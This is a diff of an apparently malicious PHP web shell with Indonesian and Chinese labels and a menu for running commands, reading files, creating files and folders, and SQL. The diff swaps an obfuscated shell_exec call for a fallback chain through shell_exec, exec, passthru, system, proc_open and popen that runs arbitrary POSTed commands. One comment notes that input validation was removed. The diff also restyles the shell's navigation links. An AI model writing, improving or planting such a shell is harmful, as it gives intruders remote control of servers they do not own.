@@ -895,24 +895,63 @@ print '<hr>';
 // ===========================================================================
 // Tampilan halaman berdasarkan aksi yang dipilih (PHP信息, 命令, 文件读取, SQL, dsb.)
 // ===========================================================================
-if($awal=="phpinfo")
-{
-	print "<div style='width: 100%; height: 400px;'><iframe src='?awal=pinf' style='width: 100%; height: 400px; border: 0;'></iframe></div>";
-}
-else if($awal=="sistem_kom")
-{
-	if(isset($_POST['kom']) && is_string($_POST['kom']) && !empty($_POST['kom']))
-	{
-		$komanda = uraikan(urldecode($_POST['kom']));
-		$k = 'sh';
-		$k .= 'el';
-		$k .= 'l_e';
-		$k .= 'xe';
-		$k .= 'c';
-		$output = $k($komanda);
-		print '<pre style="max-height: 350px;overflow: auto; border: 1px solid #777; padding: 5px;">' . htmlspecialchars($output) . '</pre><hr>';
-	}
-	print '<input type="text" id="emr_et_atash" style="width: 500px;"> <button type="button" class="btn" onclick="sistemKom();">确定</button>';
+if ($awal == "sistem_kom") {
+    if (isset($_POST['kom']) && is_string($_POST['kom']) && !empty($_POST['kom'])) {
+        $komanda = urldecode($_POST['kom']); // Hapus validasi regex
+
+        // Pilih metode eksekusi perintah
+        $output = '';
+        if (function_exists('shell_exec')) {
+            // Menggunakan shell_exec
+            $output = shell_exec($komanda);
+        } elseif (function_exists('exec')) {
+            // Menggunakan exec
+            exec($komanda, $outputArray);
+            $output = implode("\n", $outputArray); // Menggabungkan array output menjadi string
+        } elseif (function_exists('passthru')) {
+            // Menggunakan passthru
+            ob_start();
+            passthru($komanda);
+            $output = ob_get_clean();
+        } elseif (function_exists('system')) {
+            // Menggunakan system
+            ob_start();
+            system($komanda);
+            $output = ob_get_clean();
+        } elseif (function_exists('proc_open')) {
+            // Menggunakan proc_open untuk kontrol lebih baik
+            $descriptorspec = [
+                0 => ["pipe", "r"], // stdin
+                1 => ["pipe", "w"], // stdout
+                2 => ["pipe", "w"]  // stderr
+            ];
+            $process = proc_open($komanda, $descriptorspec, $pipes);
+            if (is_resource($process)) {
+                $output = stream_get_contents($pipes[1]);
+                fclose($pipes[1]);
+                proc_close($process);
+            }
+        } elseif (function_exists('popen')) {
+            // Menggunakan popen
+            $handle = popen($komanda, 'r');
+            if ($handle) {
+                $output = '';
+                while (!feof($handle)) {
+                    $output .= fread($handle, 4096);
+                }
+                pclose($handle);
+            }
+        } else {
+            die("Tidak ada metode eksekusi perintah yang tersedia.");
+        }
+
+        // Memastikan $output tidak null sebelum menggunakan htmlspecialchars
+        $output = $output ?? ""; // Jika $output null, ubah menjadi string kosong
+
+        // Menampilkan output
+        print '<pre style="max-height: 350px; overflow: auto; border: 1px solid #777; padding: 5px;">' . htmlspecialchars($output) . '</pre><hr>';
+    }
+    print '<input type="text" id="emr_et_atash" style="width: 500px;"> <button type="button" class="btn" onclick="sistemKom();">确定</button>';
 }
 else if($awal=="baca_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "")
 {
@@ -1198,9 +1237,26 @@ else
 ?>
 <hr>
 
-<a href="javascript:newFile();">新建文件</a> | <a href="javascript:newPapka();">新建文件夹</a><br>
-<a href="javascript:halaman('?awal=sistem_kom&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>')">命令</a><br>
-<a href="javascript:halaman('?awal=skl');">SQL</a><br>
+<!-- Tempelkan snippet ini di lokasi menu navigasi Anda (misalnya, setelah tag <hr> pada file utama) -->
+<div style="text-align: center; margin: 20px 0;">
+  <a href="javascript:newFile();" 
+     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
+    新建文件
+  </a>
+  <a href="javascript:newPapka();" 
+     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
+    新建文件夹
+  </a>
+  <a href="javascript:halaman('?awal=sistem_kom&berkas=<?=urlencode(urlencode(kunci($default_dir)))?>')" 
+     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
+    命令
+  </a>
+  <a href="javascript:halaman('?awal=skl');" 
+     style="display: inline-block; padding: 10px 20px; margin: 5px; background-color: #007BFF; color: #fff; text-decoration: none; border-radius: 5px;">
+    SQL
+  </a>
+</div>
+
 
 
 <form method="POST" id="post_form" style="display: none;"></form>
